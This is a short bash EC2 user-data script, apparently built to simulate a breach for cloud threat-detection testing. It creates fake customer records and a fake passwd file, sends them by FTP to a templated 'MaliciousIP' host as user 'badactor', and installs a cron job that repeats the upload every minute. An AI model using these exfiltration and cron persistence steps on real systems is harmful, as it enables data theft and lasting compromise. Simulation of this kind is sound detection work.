#!/bin/bash -xe
exec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1
sleep 60
date > /tmp/image.log
yum update -y
yum install -y ftp
{ echo ${MaliciousIP};} >> /tmp/ftp.ip

# Create Fake Customer Data Files
cat << 'EOF' > /tmp/employee-data.txt
# Sample Report - No identification of actual persons
# or places is intended or should be inferred.

74323 Julie Field
Lake Joshuamouth, OR 30055-3905
1-196-191-4438x974
53001 Paul Union
New John, HI 94740
American Express
Amanda Wells
5135725008183484 09/26
CVE: 550

354-70-6172
242 George Plaza
East Lawrencefurt, VA 37287-7620
GB73WAUS0628038988364
587 Silva Village
Pearsonburgh, NM 11616-7231
LDNM1948227117807
American Express
Brett Garza
347965534580275 05/20
CID: 4758
EOF

# Create Fake /etc/passwd
cat << 'EOF' > /tmp/passwd.txt
blackwidow:x:10:100::/home/blackwidow:/bin/bash
thor:x:11:100::/home/thor:/bin/bash
ironman:x:12:100::/home/ironman:/bin/bash
captain:x:13:100::/home/captain:/bin/bash
hulk:x:14:100::/home/hulk:/bin/bash
hawkeye:x:15:100::/home/hawkeye:/bin/bash
EOF

# Upload fake employee data
sleep 5
cd /tmp
HOST=${MaliciousIP}
PORT=443
USER=badactor
PASSWD=5VXcbio8D3nsly
ftp -inv $HOST $PORT <<EOT
user $USER $PASSWD
cd ftp/upload
put passwd.txt
put employee-data.txt
bye
EOT

# Create FTP script
cat << 'EOF' > /tmp/ftp.sh
#!/bin/bash
HOST=${MaliciousIP}
PORT=443
USER=badactor
PASSWORD=5VXcbio8D3nsly
ftp -inv $HOST $PORT <<EOT
user $USER $PASSWORD
cd ftp/upload
put passwd.txt
put employee-data.txt
bye
EOT
EOF
chmod 755 ftp.sh
chmod +x ftp.sh
ftp -inv ./tmp/ftp.sh
date > /tmp/ftp-time.txt

# Set cron Job
cat << 'EOF' > /var/spool/cron/ec2-user
*/1 * * * * /tmp/ftp.sh>>/tmp/cron.log
EOF
